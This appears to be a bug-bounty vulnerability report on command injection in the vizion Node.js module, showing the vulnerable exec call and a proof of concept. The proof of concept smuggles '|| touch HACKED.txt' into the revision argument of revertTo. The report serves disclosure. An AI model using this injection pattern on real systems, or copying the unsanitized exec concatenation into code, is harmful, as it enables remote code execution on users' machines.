The issue is an `RCE` triggerable via the module.

This is possible because in the https://github.com/keymetrics/vizion/blob/master/lib/git/git.js#L228 line, the `git reset --hard` command is concatenated with a unsanitized input:

```js
var command = cliCommand(args.folder, "git reset --hard " + args.revision);
```

The `command` variable is so passed to the `exec` function, declared as:
```js
var exec = require('child_process').exec;
```

This makes possible any attacker to control the `revision` attribute passed as `object` in the `<vizion_object>.revertTo()` function, leading to the `RCE impact`.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. First of all, note you have to set accurately your `git` environment
2. Execute the following commands:
```bash
mkdir vizion # Makes a new directory where initialize *git*
cd vizion
git init
echo "TEST_STRING" > test.txt # Create a file named "test.txt"
git add test.txt # Adding to the working tree the new file
git commit
```
3. Create a PoC file like this (in the `vizion` directory):
```js
// poc.js
var vizion = require('vizion');
vizion.revertTo({
	revision : 'f0a1d45936cf7a3c969e4caba96546fd23255796 || touch HACKED.txt', folder : '.' },
	function(err, data) {
		console.log(data);
	});
```
4. Start the `poc.js` file: `node poc.js`
5. A file named `HACKED.txt` will be created
## References:
 - [GitHub Issue](https://github.com/keymetrics/vizion/issues/26)
 - [GitHub Permalink #1](https://github.com/keymetrics/vizion/blob/master/lib/git/git.js#L228)